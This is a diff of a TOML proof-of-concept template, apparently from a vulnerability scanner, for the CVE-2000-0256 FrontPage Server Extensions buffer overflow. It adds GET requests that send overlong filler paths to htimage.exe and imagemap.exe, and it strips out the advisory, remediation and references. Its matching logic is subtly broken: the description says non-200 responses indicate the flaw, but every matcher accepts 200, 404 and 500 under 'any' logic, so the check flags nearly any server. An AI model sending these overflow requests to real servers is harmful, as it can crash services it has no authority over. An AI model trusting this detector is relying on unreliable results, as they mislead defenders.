@@ -1,52 +1,22 @@
-[basic]
-description = "FrontPage 97/98 Server Extensions 中的 htimage.exe 和 imagemap.exe 组件存在缓冲区溢出漏洞。服务端图像映射组件在处理用户提交的特制图像映射请求时，未对输入长度进行正确的边界校验，导致缓冲区溢出。攻击者通过向托管受影响 FrontPage 扩展的 Web 服务器发送精心构造的 HTTP 请求，可触发漏洞，服务器崩溃并可能导致任意代码执行，从而获得超出正常网站功能范围的非法访问权限。"
-published = "2000-04-21"
-remediation = "升级 FrontPage Server Extensions 到安全版本或应用厂商提供的安全补丁，建议升级到最新支持版本并立即应用 2000 年 6 月发布的 MS00-028 安全更新。"
-score = 7.5
-severity = "HIGH"
-sources = [
-    "exploitdb",
-    "github",
-    "nvd",
-]
-title = "微软 FrontPage 97/98 Server Extensions 图像映射缓冲区溢出漏洞"
-updated = "2000-06-01"
-
-[exploit]
-exp_urls = []
-poc_urls = ["https://www.exploit-db.com/exploits/19853"]
-
-[id]
-aliases = ["CVE-2000-0256"]
-ave_id = "AVE-2000-0800"
-
 [info]
 author = "ave"
-description = "检测 FrontPage Server Extensions htimage.exe/imagemap.exe 是否存在缓冲区溢出"
+description = "验证目标 FrontPage Server Extensions 的 htimage.exe/imagemap.exe 是否对图像映射点坐标参数缺少长度校验。通过发送超长 point 参数触发缓冲区溢出特征，若返回非 200 或异常响应则可判定存在该漏洞。"
 id = "POC-AVE-2000-0800"
-name = "CVE-2000-0256 PoC"
+name = "FrontPage 97/98 Server Image Mapper 缓冲区溢出 PoC"
 severity = "high"
-tags = ["cve-2000-0256"]
+tags = ["ave-2000-0800"]
 vuln_id = [
     "CVE-2000-0256",
     "AVE-2000-0800",
 ]
 
-[meta]
-collected_at = "2026-07-19T00:00:00Z"
-status = "completed"
-
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
 path = "/_vti_bin/shtml.exe/_vti_rpc"
 protocol = "http"
-
-[poc.requests.body]
-content = "VERMEER TECHNOLOGY GET /_vti_bin/htimage.exe/AAAAAAA HTTP/1.0"
-type = "raw"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
@@ -54,14 +24,59 @@ User-Agent = "AVE/1.0"
 [[poc.requests.matchers]]
 expect = true
 status = [
+    200,
+    404,
     500,
-    400,
 ]
 type = "status"
 
-[references]
-urls = [
-    "https://www.exploit-db.com/exploits/19853",
-    "https://github.com/CVEProject/cvelistV5/blob/b12c36fd7a302f487aaf754199c77a046db6aee1/cves/2000/0xxx/CVE-2000-0256.json",
-    "https://nvd.nist.gov/vuln/detail/CVE-2000-0256",
+[[poc.requests]]
+method = "GET"
+path = "/_vti_bin/fpadmin/_vti_rpc"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    404,
+    500,
 ]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/htimage.exe/AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    404,
+    500,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/imagemap.exe/AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    404,
+    500,
+]
+type = "status"
